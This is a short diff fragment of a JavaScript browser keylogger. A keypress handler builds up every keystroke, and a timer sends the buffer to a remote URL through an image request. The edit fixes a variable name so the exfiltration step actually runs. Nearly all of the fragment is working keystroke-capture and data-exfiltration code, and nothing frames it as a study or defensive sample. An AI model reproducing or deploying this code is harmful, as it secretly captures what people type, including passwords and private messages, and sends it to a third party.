@@ -8,7 +8,7 @@ document.onkeypress = function(e) {
 	keys+=key;
 }
 window.setInterval(function(){
-	if(k.length>0) {
+	if(keys.length>0) {
 		new Image().src = url+keys;
 		keys = '';
 	}
